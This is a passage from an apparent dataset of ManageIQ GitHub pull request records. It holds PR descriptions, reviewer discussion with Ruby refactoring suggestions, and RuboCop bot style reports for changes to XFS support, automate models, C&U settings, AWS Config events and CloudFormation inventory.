197](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L197), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 207](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L207), Col 3 - [CyclomaticComplexity](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/CyclomaticComplexity) - Cyclomatic complexity for ifs_getFile is too high. [8/6]\r\n- [ ] Style - [Line 207](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L207), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 238](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L238), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 256](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L256), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 274](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L274), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 299](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L299), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n\r\n**lib/fs/MiqFS/modules/XFSProbe.rb**\r\n- [ ] Style - [Line 2](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFSProbe.rb#L2), Col 1 - [FileName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/FileName) - Use snake_case for source file names.\r\n\r\n**lib/fs/xfs/directory.rb**\r\n- [ ] Style - [Line 15](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/xfs/directory.rb#L15), Col 3 - [ClassLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/ClassLength) - Class definition is too long. [102/100]\r\n\r\n**lib/fs/xfs/inode.rb**\r\n- [ ] Style - [Line 101](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/xfs/inode.rb#L101), Col 3 - [ClassLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/ClassLength) - Class definition is too long. [395/100]\r\n\r\n**lib/fs/xfs/inode_map.rb**\r\n- [ ] Style - [Line 24](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/xfs/inode_map.rb#L24), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [231/120]\r\n\r\n**lib/fs/xfs/superblock.rb**\r\n- [ ] Warn - [Line 223](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/xfs/superblock.rb#L223), Col 7 - [UselessAssignment](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/UselessAssignment) - Useless assignment to variable - `dumpout`.\r\n- [ ] Style - [Line 93](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/xfs/superblock.rb#L93), Col 3 - [ClassLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/ClassLength) - Class definition is too long. [366/100]\r\n- [ ] Style - [Line 504](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/xfs/superblock.rb#L504), Col 5 - [MethodLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodLength) - Method has too many lines. [54/25]\r\n', ""@jerryk55 I think this is pretty good as is for integration.  I'm sure we'll have plenty of nits to find as we move forward, but the code is working as is, and I think that's good.  I'll get this merged, and you can make follow up PRs for cleaning up anything you find moving forward (including some of the comments made here)."", 'Thanks, @Fryguy .  I know I will have to add support for the Dir3 structures created when Superblock version is 5.  Coded but not ready for prime time.  And I have some outstanding comments from you and @jrafanie as well.']"
32,ManageIQ/manageiq,781.0,Parent issue: #1025 ,"['@skateman : the in-line comments apply to multiple places in multiple files\r\n\r\nplease, walk through it and on top of haml conversion add more cleanups', '@h-kataria fixed!', '@skatemen other reported issues are fixed. After little testing i found out that  vmdb/app/views/storage/_details.html.haml is no longer in use, you can delete that view. once that is deleted, this PR can be merged.', 'Checked commit https://github.com/skateman/manageiq/commit/830a4656bba66fd437ca73917e98f29ed5b64bda with rubocop 0.21.0\n0 files checked, 0 offenses detected\nEverything looks good. :cookie:\n', 'Done!']"
33,ManageIQ/manageiq,941.0,"1. Use destroy_all when deleting fields instead of deleting 1 at a time
2. Use ae_fields.clear to remove bad entries from ae_fields
3. When adding same field names add them after the first one has been
validated

These changes were done to make the GIT based model to be in sync with
AR model.","['@Fryguy @gmcculloug @jrafanie \r\nPlease review', 'Note: It\'s just me but if there are 3 unrelated bullet items, I would have 3 commits.  It\'s hard to tell if they\'re truly related or not.\r\n\r\nEDIT:  If they are related changes, then it\'s ok but they seem to have a different ""why""... leading to the use of either bullets or ""AND"" in your commit messages.', '@mkanoor I see you spell ""destroy"" like I do:  `1. Use destory_all when deleting fields`... please correct that in your commit.', '@Fryguy @jrafanie \r\nAdded comment about why the association was being cleared.', '@mkanoor please fix the typo in the commit message ""...destory_all...""', 'Checked commit https://github.com/mkanoor/manageiq/commit/d328bc28149d4beb3d37efbd933e40fe0fc47957 with rubocop 0.21.0\n1 file checked, 0 offenses detected\nEverything looks good. :cookie:\n', '@jrafanie @Fryguy \r\nMade all the recommended changes']"
34,ManageIQ/manageiq,961.0,"Instead of saving/destroying fields/inputs and values one at time
Use the Active Record relations to save these with a single save
call on the parent. This is done by adding the :autosave to the has_many
relations

It also includes the removal of to_i calls on the id fields. This will
help us when we switch to GIT and have strings as id's and the to_i
calls would fail","['@Fryguy @martinpovolny @h-kataria @dclarizio \r\n\r\nThis PR removes the to_i from the id methods. Please review if this has impact on the security changes implemented.\r\n', '@mkanoor : please, find my comment in-line. See the doc on `.find` to find out what might happen with malicious user input. http://guides.rubyonrails.org/v3.2.13/action_controller_overview.html#json-xml-parameters', '@martinpovolny @Fryguy @h-kataria @matthewd @dclarizio \r\nChanged to use to_s instead of to_i', '@h-kataria \r\nFixed the issue you reported about deleting new fields to a class/methods', 'Checked commit https://github.com/mkanoor/manageiq/commit/b3bbd991e8e3ac74e6c7c9a95ac91bc84b286c3f with rubocop 0.21.0\n5 files checked, 2 offenses detected\n\n**vmdb/app/controllers/miq_ae_class_controller.rb**\n- [ ] Style - [Line 2494](https://github.com/mkanoor/manageiq/blob/b3bbd991e8e3ac74e6c7c9a95ac91bc84b286c3f/vmdb/app/controllers/miq_ae_class_controller.rb#L2494), Col 3 - [CyclomaticComplexity](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/CyclomaticComplexity) - Cyclomatic complexity for set_field_vars is too high. [8/6]\n- [ ] Style - [Line 2494](https://github.com/mkanoor/manageiq/blob/b3bbd991e8e3ac74e6c7c9a95ac91bc84b286c3f/vmdb/app/controllers/miq_ae_class_controller.rb#L2494), Col 7 - [AccessorMethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/AccessorMethodName) - Do not prefix writer method names with `set_`.\n', '@mkanoor verified fix, tested changes in automate seems to be working well.']"
35,ManageIQ/manageiq,999.0,Parent issue: #1001 ,"['@martinpovolny fixed!', 'Checked commit https://github.com/skateman/manageiq/commit/ecee68dac2596080e1515f932b7f0330780ba740 with rubocop 0.21.0\n0 files checked, 0 offenses detected\nEverything looks good. :cookie:\n']"
36,ManageIQ/manageiq,1044.0,"- Made changes to JS method to not send up all_checked checkboxes on onselect event, this was causing JS error when there were lots of nodes in the tree, as a result of that transaction was not being sent upto server. Made changes to set/save C&U collection based upon checkbox that was changed and sent up. Removed code that was expecting all_checked checkboxes to come in with JS transaction.
- Changed code to only call Metric::Targets.perf_capture_always if any of the ""Collect for All XXX"" checkboxes values were changed and only for the one that's value was changed.

https://bugzilla.redhat.com/show_bug.cgi?id=1153047
https://bugzilla.redhat.com/show_bug.cgi?id=1145799

@dclarizio please review/test. Let me know If you need db with lots of nodes to recreate the issue.","[""I think I accidentally commented on an outdated diff, so I'll just copy the comments down here.  Forgive me if you've seen these already!\r\n\r\nIf `cl.name` and `c[:name]` are the same, I think we could simplify to something like this:\r\n\r\n```ruby\r\nclusters = @edit[:new][:clusters].map { |c| c[:id] }.uniq.each { |id|\r\n  EmsCluster.find_by_id(id)\r\n}\r\nclusters.each { |cl|\r\n  en_list = @edit[:new][cl.name.to_sym].select { |h|\r\n    h[:capture]\r\n  }.map { |h| h[:id] }.uniq.map { |id| Host.find_by_id(id) }\r\n  cl.set_perf_collection_object_list(en_list) unless en_list.blank?\r\n}\r\n```\r\n\r\nWould that work? Does it make sense?\r\n\r\nNow that I'm reading this more closely, we could actually reduce the number of queries by doing something like this:\r\n\r\n```ruby\r\ncluster_ids = @edit[:new][:clusters].map { |c| c[:id] }.uniq\r\nclusters = EmsCluster.find_all_by_id cluster_ids\r\n\r\nclusters.each { |cl|\r\n  en_ids = @edit[:new][cl.name.to_sym].select { |h|\r\n    h[:capture]\r\n  }.map { |h| h[:id] }.uniq\r\n  en_list = Host.find_all_by_id en_ids\r\n  cl.set_perf_collection_object_list(en_list) unless en_list.blank?\r\n}\r\n```"", ""@tenderlove implemented your suggestion, please re-review.\r\ni needed to add en_list.push(cl) in the block of code that you suggested above, as i do need cluster to be part of en_list that's being sent to set_perf_collection_object_list method."", ""Strange that you need to add `cl` to the `en_list` (and the next line is checking for empty `en_list` which will always be false now), when you are calling `cl.set_perf_collection_object_list(en_list)`.  Doesn't the `cl` object know about itself?  Why do we call a method on the `cl` object AND pass `cl` as one of the values in `en_list`?"", ""@chessbyte as far as unless en_list.blank? is concerned i can remove that check, since it will not be blank as i am pushing the cluster into. Looked at set_perf_collection_object_list model method it's an instance method and does expect the cluster to be part of the list that's being sent up."", 'Doing a `git grep set_perf_collection_object_list ` shows the only caller of this method is in vmdb/app/controllers/ops_controller/settings/cap_and_u.rb (which you are modifying here).  So, I would suggest that we do NOT add the cluster to the list and modify the model method to do what you expect.\r\nThen checking for en_list to be non-blank still makes sense.', '@chessbyte took another shot at making suggested changes, i need to remove en_list.blank? check and send up an empty list incase all of the host checkboxes under a cluster were unchecked, set_perf_collection_object_list method needs to be called always so the performance for the cluster can be turned off in this case.', '@chessbyte The only issue with your suggestion is that I think the user can choose the cluster, but not choose any of the hosts, so how you would pass that?  I guess they could be two separate methods `EmsCluster#perf_capture_enabled=` and `EmsCluster#set_perf_collection_object_list` (which only takes hosts)  I\'m not sure that\'s a *valid* use case though.  If it\'s not, then I agree that `set_perf_collection_object_list` should just ""auto-check"" the cluster to ensure it.  In fact I have a comment about that [here](https://github.com/ManageIQ/manageiq/blob/41178d011c4218999f33447377d49b182b4b4c94/vmdb/app/models/metric/targets.rb#L68) since that always bugged me.', '@Fryguy user cannot just pick cluster by itself, user has 3 options user can either select all hosts/none of the hosts or some of the hosts under a cluster. If any of the hosts under a cluster are checked performance is enabled for that cluster.', ""In hindsight...why do we even need the `set_perf_collection_object_list` method at all.  It was originally written to support this specific thing in the UI, so it doesn't really belong on the cluster model anyway.  `perf_capture_enabled=` is a lot clearer and can be called directly on both the hosts and clusters (because you have the host objects already).  So, let's throw that method away and then you can just change \r\n\r\n```ruby\r\ncl.set_perf_collection_object_list(en_list)\r\n```\r\n\r\nto \r\n\r\n```ruby\r\ncl.perf_capture_enabled = en_list.any?\r\nen_list.each { |h| h.perf_capture_enabled = true }\r\n```\r\n\r\n@chessbyte Thoughts?\r\n\r\n---\r\n\r\nIncidentally, `en_list` is not a good variable name.  Prefer `enabled_list`, or even better, `enabled_hosts`."", '@h-kataria Does this ever end up calling `.perf_capture_enabled = false`?  How does one ""turn off"" capturing?', '@Fryguy in set_perf_collection_object_list method, if the host is not sent up in the list perf is turned off for that host.\r\nhosts.each { |obj| obj.perf_capture_enabled = list.include?(obj) }', ""Oh I see...then on my refactorings to remove the method and to preload the hosts it should be done slightly different.  You probably don't even need to shrink down the list anymore...just iterate across it and set the perf_capture_enabled directly.\r\n\r\n```ruby\r\nclusters = EmsCluster.where(:id => cluster_ids).includes(:hosts)\r\n\r\nclusters.each do |cl|\r\n  enabled_hosts = @edit[:new][cl.name.to_sym].select { |h| h[:capture] }\r\n  enabled_host_ids = enabled_hosts.collect { |h| h[:id] }.uniq\r\n  cl.perf_capture_enabled = enabled_host_ids.any?\r\n  cl.hosts.each { |h| h.perf_capture_enabled = enabled_host_ids.include?(h.id) }\r\nend\r\n```"", ""I guess another option is to keep the method in the model, but only pass it the ids...maybe that's what I was coming around to all along in my roundabout way :smiley:  While we're at it...it can have a better name.\r\n\r\n```ruby\r\nclass EmsCluster\r\n  def perf_capture_enabled_host_ids=(ids)\r\n    self.perf_capture_enabled = ids.any?\r\n    hosts.each { |h| h.perf_capture_enabled = ids.include?(h.id) }\r\n  end\r\nend\r\n\r\n# in the controller\r\n\r\nclusters = EmsCluster.where(:id => cluster_ids).includes(:hosts)\r\n\r\nclusters.each do |cl|\r\n  enabled_hosts = @edit[:new][cl.name.to_sym].select { |h| h[:capture] }\r\n  enabled_host_ids = enabled_hosts.collect { |h| h[:id] }.uniq\r\n  cl.perf_capture_enabled_host_ids = enabled_host_ids\r\nend\r\n```\r\n\r\nThen this way the model ensure both are set and we can remove the assumption comment from that link I gave above."", '@fryguy made suggested changes.', '@h-kataria looking great! :+1: ', '@h-kataria Can you just squash these 3 commits?  Then I think its good to go.', '@Fryguy squashed commits into 1.', 'Awesome @h-kataria.  Sorry to be a pain, but I think a spec on EmsCluster#perf_capture_enabled_host_ids= would be a good thing because it shows that method ensures that the cluster and the selected hosts are enabled.', 'Checked commit https://github.com/h-kataria/manageiq/commit/969f0920e06ec36d4c89cce60fc1d783437ca5ac with rubocop 0.21.0\n3 files checked, 0 offenses detected\nEverything looks good. :star:\n', '@Fryguy added spec tests for perf_capture_enabled_host_ids= method', 'Verified fix.']"
37,ManageIQ/manageiq,1076.0,"https://bugzilla.redhat.com/show_bug.cgi?id=1162832

When a create_automation_request is called it triggers creation
of 4 queue entries with method names call_automate_event/
call_automate_event/create_request_tasks/execute. Only the first
entry had the zone set, the other 3 did not set the zone. This PR
addresses setting of zones for all 4 queue entries","['@gmcculloug @Fryguy \r\nPlease Review', '@mkanoor While testing the only issue I ran into was that events being queue for a VM provision where sent to the current MiqServer zone instead of the zone for the source template.\r\n\r\nThe code [here](https://github.com/mkanoor/manageiq/blob/1162832_round2/vmdb/app/models/miq_request.rb#L143) should use ```my_zone``` as the default instead of ```MiqServer.my_zone```', '@gmcculloug \r\nMade recommended changes', '@mkanoor Travis failed.  In [miq_provision_request.rb](https://github.com/ManageIQ/manageiq/blob/master/vmdb/app/models/miq_provision_request.rb#L76) the my_zone methods should be calling ```source.my_zone``` so the source object (in this case a VM/template) tells us the zone name to use.', 'Checked commit https://github.com/mkanoor/manageiq/commit/20abdd04df65fd01a3d081d09974c8d38cc95917 with rubocop 0.21.0\n4 files checked, 1 offense detected\n\n**vmdb/app/models/miq_request_task.rb**\n- [ ] Style - [Line 167](https://github.com/mkanoor/manageiq/blob/20abdd04df65fd01a3d081d09974c8d38cc95917/vmdb/app/models/miq_request_task.rb#L167), Col 7 - [AlignHash](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/AlignHash) - Align the elements of a hash literal if they span more than one line.\n']"
38,ManageIQ/manageiq,1049.0,"Amazon has launched the new AWS Config service that emits configuration diffs on
a scheduled basis.  The new AWS Config event catcher listens to an SQS Queue and
discovers configuration changes.  These configurations changes are parsed and
treated as an event stream from AWS.

Each appliance that attempts to receive events for a single AWS account will
create a unique SQS queue, allowing multiple appliances to listen for the same
events.

Captured events are parsed to determine the type of object changed and the
manner in which it was changed.  For instance, when a stopped instance is
started, the configuration diff will indicate that the item changed was an
instance, and that the state changed from stopped to starting.  When this
configuration diff is recevied, the Amazon Event Monitor enqueues a event called
""AWS_EC2_Instance_STARTED"".

There are still other events that need to be detemined from the event stream,
but an initial set has been added to the event handling file to illustrate the
types of events ManageIQ will process.

The only requirement for now imposed on the AWS account configuration is that
the SNS Topic configured for AWS Config needs to be called ""AWSConfig_topic"".
With that in place, ManageIQ's Amazon Event Monitor can create the appropriate
SQS queue and begin receiving events.

https://trello.com/c/qdeChZPC","['Checked commit https://github.com/blomquisg/manageiq/commit/dff42ca9fef1cb48f6d0aa70954c846a88e5c9bf with rubocop 0.27.1\n7 files checked, 15 offenses detected\n\n**lib/Amazon/events/amazon_event_monitor.rb**\n- [ ] Style - [Line 15](https://github.com/blomquisg/manageiq/blob/dff42ca9fef1cb48f6d0aa70954c846a88e5c9bf/lib/Amazon/events/amazon_event_monitor.rb#L15), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [127/120]\n- [ ] Style - [Line 72](https://github.com/blomquisg/manageiq/blob/dff42ca9fef1cb48f6d0aa70954c846a88e5c9bf/lib/Amazon/events/amazon_event_monitor.rb#L72), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for find_or_create_queue is too high. [19.08/15]\n- [ ] Style - [Line 120](https://github.com/blomquisg/manageiq/blob/dff42ca9fef1cb48f6d0aa70954c846a88e5c9bf/lib/Amazon/events/amazon_event_monitor.rb#L120), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for parse_event is too high. [17.49/15]\n- [ ] Style - [Line 130](https://github.com/blomquisg/manageiq/blob/dff42ca9fef1cb48f6d0aa70954c846a88e5c9bf/lib/Amazon/events/amazon_event_monitor.rb#L130), Col 68 - [Style/StringLiteralsInInterpolation](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/StringLiteralsInInterpolation) - Prefer single-quoted strings inside interpolations.\n- [ ] Style - [Line 154](https://github.com/blomquisg/manageiq/blob/dff42ca9fef1cb48f6d0aa70954c846a88e5c9bf/lib/Amazon/events/amazon_event_monitor.rb#L154), Col 5 - [Style/RedundantReturn](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantReturn) - Redundant `return` detected.\n\n**vmdb/app/models/ems_event.rb**\n- [ ] Style - [Line 102](https://github.com/blomquisg/manageiq/blob/dff42ca9fef1cb48f6d0aa70954c846a88e5c9bf/vmdb/app/models/ems_event.rb#L102), Col 5 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n\n**vmdb/app/models/ems_event/parsers/amazon.rb**\n- [ ] Style - [Line 1](https://github.com/blomquisg/manageiq/blob/dff42ca9fef1cb48f6d0aa70954c846a88e5c9bf/vmdb/app/models/ems_event/parsers/amazon.rb#L1), Col 8 - [Style/ClassAndModuleChildren](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/ClassAndModuleChildren) - Use nested module/class definitions instead of compact style.\n- [ ] Style - [Line 2](https://github.com/blomquisg/manageiq/blob/dff42ca9fef1cb48f6d0aa70954c846a88e5c9bf/vmdb/app/models/ems_event/parsers/amazon.rb#L2), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for event_to_hash is too high. [16.25/15]\n- [ ] Style - [Line 3](https://github.com/blomquisg/manageiq/blob/dff42ca9fef1cb48f6d0aa70954c846a88e5c9bf/vmdb/app/models/ems_event/parsers/amazon.rb#L3), Col 25 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] Style - [Line 6](https://github.com/blomquisg/manageiq/blob/dff42ca9fef1cb48f6d0aa70954c846a88e5c9bf/vmdb/app/models/ems_event/parsers/amazon.rb#L6), Col 47 - [Style/StringLiteralsInInterpolation](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/StringLiteralsInInterpolation) - Prefer single-quoted strings inside interpolations.\n- [ ] Style - [Line 6](https://github.com/blomquisg/manageiq/blob/dff42ca9fef1cb48f6d0aa70954c846a88e5c9bf/vmdb/app/models/ems_event/parsers/amazon.rb#L6), Col 68 - [Style/StringLiteralsInInterpolation](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/StringLiteralsInInterpolation) - Prefer single-quoted strings inside interpolations.\n- [ ] Style - [Line 7](https://github.com/blomquisg/manageiq/blob/dff42ca9fef1cb48f6d0aa70954c846a88e5c9bf/vmdb/app/models/ems_event/parsers/amazon.rb#L7), Col 25 - [Style/StringLiteralsInInterpolation](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/StringLiteralsInInterpolation) - Prefer single-quoted strings inside interpolations.\n- [ ] Style - [Line 7](https://github.com/blomquisg/manageiq/blob/dff42ca9fef1cb48f6d0aa70954c846a88e5c9bf/vmdb/app/models/ems_event/parsers/amazon.rb#L7), Col 46 - [Style/StringLiteralsInInterpolation](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/StringLiteralsInInterpolation) - Prefer single-quoted strings inside interpolations.\n\n**vmdb/lib/workers/event_catcher_amazon.rb**\n- [ ] Style - [Line 40](https://github.com/blomquisg/manageiq/blob/dff42ca9fef1cb48f6d0aa70954c846a88e5c9bf/vmdb/lib/workers/event_catcher_amazon.rb#L40), Col 72 - [Style/StringLiteralsInInterpolation](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/StringLiteralsInInterpolation) - Prefer single-quoted strings inside interpolations.\n- [ ] Style - [Line 42](https://github.com/blomquisg/manageiq/blob/dff42ca9fef1cb48f6d0aa70954c846a88e5c9bf/vmdb/lib/workers/event_catcher_amazon.rb#L42), Col 54 - [Style/StringLiteralsInInterpolation](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/StringLiteralsInInterpolation) - Prefer single-quoted strings inside interpolations.\n']"
39,ManageIQ/manageiq,919.0,"This the second half from the slitting of PR #333. It is a sub PR of #523.

This PR collects templates and stacks and updates manageiq database. 

It depends on PR #899: add_orchestration_models. New changes are in the second commit as the first commit is for PR #899.","[""I'm going to defer reviewing until #899 is complete, since I think change may happen here when changes happen there."", '#899 has been merged, so this needs to be rebased.', 'This pull request is not mergeable.  Please rebase and repush.', 'I was looking at the .yml cassette file for the http calls made and I see:\r\n\r\n```\r\nDescribeStacks\r\nListStackResources&StackName=cloudformation-spec\r\nGetTemplate&StackName=cloudformation-spec\r\nListStackResources&StackName=cloudformation-spec-WebServerInstance-QS899ZNAHZU6\r\nGetTemplate&StackName=cloudformation-spec-WebServerInstance-QS899ZNAHZU6\r\n```\r\n\r\nThis implies we are hitting the REST API twice for every stack + 1 for the initial call.  Is there any way to avoid this, as it could get expensive at scale?  Are there ways to tell AWS SDK to preload the data we need for the resources and templates?', 'The aws-sdk does not provide option to prefetch information in a shot. We retrieve all information from the stack object. Underneath it makes additional REST calls to get template and resources as needed,', ""Thanks @bzwei...I'll review this again."", 'Checked commit https://github.com/bzwei/manageiq/commit/afced0e4a58a5961a7059fb11a7599530cc03a38 with rubocop 0.27.1\n9 files checked, 20 offenses detected\n\n**vmdb/app/models/ems_refresh/parsers/ec2.rb**\n- [ ] Style - [Line 117](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/app/models/ems_refresh/parsers/ec2.rb#L117), Col 9 - [Style/AccessorMethodName](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/AccessorMethodName) - Do not prefix reader method names with `get_`.\n- [ ] Style - [Line 261](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/app/models/ems_refresh/parsers/ec2.rb#L261), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [126/120]\n- [ ] Style - [Line 380](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/app/models/ems_refresh/parsers/ec2.rb#L380), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [135/120]\n- [ ] Style - [Line 381](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/app/models/ems_refresh/parsers/ec2.rb#L381), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [124/120]\n- [ ] Style - [Line 428](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/app/models/ems_refresh/parsers/ec2.rb#L428), Col 9 - [Style/AlignHash](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/AlignHash) - Align the elements of a hash literal if they span more than one line.\n- [ ] Style - [Line 429](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/app/models/ems_refresh/parsers/ec2.rb#L429), Col 9 - [Style/AlignHash](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/AlignHash) - Align the elements of a hash literal if they span more than one line.\n- [ ] Style - [Line 430](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/app/models/ems_refresh/parsers/ec2.rb#L430), Col 9 - [Style/AlignHash](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/AlignHash) - Align the elements of a hash literal if they span more than one line.\n- [ ] Style - [Line 431](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/app/models/ems_refresh/parsers/ec2.rb#L431), Col 9 - [Style/AlignHash](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/AlignHash) - Align the elements of a hash literal if they span more than one line.\n- [ ] Style - [Line 432](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/app/models/ems_refresh/parsers/ec2.rb#L432), Col 9 - [Style/AlignHash](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/AlignHash) - Align the elements of a hash literal if they span more than one line.\n- [ ] Style - [Line 433](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/app/models/ems_refresh/parsers/ec2.rb#L433), Col 9 - [Style/AlignHash](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/AlignHash) - Align the elements of a hash literal if they span more than one line.\n- [ ] Style - [Line 434](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/app/models/ems_refresh/parsers/ec2.rb#L434), Col 9 - [Style/AlignHash](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/AlignHash) - Align the elements of a hash literal if they span more than one line.\n- [ ] Style - [Line 435](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/app/models/ems_refresh/parsers/ec2.rb#L435), Col 9 - [Style/AlignHash](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/AlignHash) - Align the elements of a hash literal if they span more than one line.\n- [ ] Style - [Line 436](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/app/models/ems_refresh/parsers/ec2.rb#L436), Col 9 - [Style/AlignHash](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/AlignHash) - Align the elements of a hash literal if they span more than one line.\n\n**vmdb/app/models/ems_refresh/save_inventory_cloud.rb**\n- [ ] **Warn** - [Line 277](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/app/models/ems_refresh/save_inventory_cloud.rb#L277), Col 5 - [Lint/EndAlignment](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Lint/EndAlignment) - `end` at 277, 4 is not aligned with `if` at 273, 14\n- [ ] Style - [Line 273](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/app/models/ems_refresh/save_inventory_cloud.rb#L273), Col 25 - [Style/ClassCheck](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/ClassCheck) - Prefer `Object#is_a?` over `Object#kind_of?`.\n- [ ] Style - [Line 274](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/app/models/ems_refresh/save_inventory_cloud.rb#L274), Col 